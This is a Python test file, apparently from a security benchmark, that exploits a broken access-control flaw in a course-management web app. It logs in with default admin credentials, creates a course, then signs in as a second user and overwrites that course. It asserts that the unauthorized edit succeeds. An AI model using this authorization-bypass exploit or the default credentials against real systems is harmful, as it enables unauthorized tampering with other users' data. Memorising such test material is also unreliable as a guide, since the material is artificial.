import requests
from helpers import get_row


def test_exploit_any_authenticated_user_can_edit_other_users_course(app_instance):
    base_url = app_instance["base_url"]
    db_path = app_instance["db_path"]

    s = requests.Session()
    s.headers.update({"Accept": "application/json"})

    # login as default admin
    r = s.post(
        f"{base_url}/api/auth/login",
        json={"username": "admin", "password": "admin123"},
        timeout=5,
    )
    assert r.status_code == 200, r.text

    # create course (admin creates)
    r = s.post(
        f"{base_url}/api/courses",
        json={"title": "Protected Course", "description": "desc"},
        timeout=5,
    )
    assert r.status_code in (200, 201), r.text
    course_id = r.json()["course_id"]

    # register other user (still logged in as admin, but registration is independent)
    r = s.post(
        f"{base_url}/api/auth/register",
        json={"username": "other_user", "password": "pass123", "display_name": "Other User"},
        timeout=5,
    )
    assert r.status_code in (200, 201), r.text

    # logout admin
    r = s.post(f"{base_url}/api/auth/logout", timeout=5)
    assert r.status_code in (200, 204), r.text

    # login as other user
    r = s.post(
        f"{base_url}/api/auth/login",
        json={"username": "other_user", "password": "pass123"},
        timeout=5,
    )
    assert r.status_code == 200, r.text

    # attempt to edit someone else's course
    r = s.put(
        f"{base_url}/api/courses/{course_id}",
        json={"title": "pwned", "description": "pwned"},
        timeout=5,
    )
    assert r.status_code == 200, r.text

    # verify DB updated
    changed = get_row(
        db_path,
        "SELECT title, description FROM courses WHERE course_id=?",
        (course_id,),
    )
    assert changed["title"] == "pwned"
    assert changed["description"] == "pwned"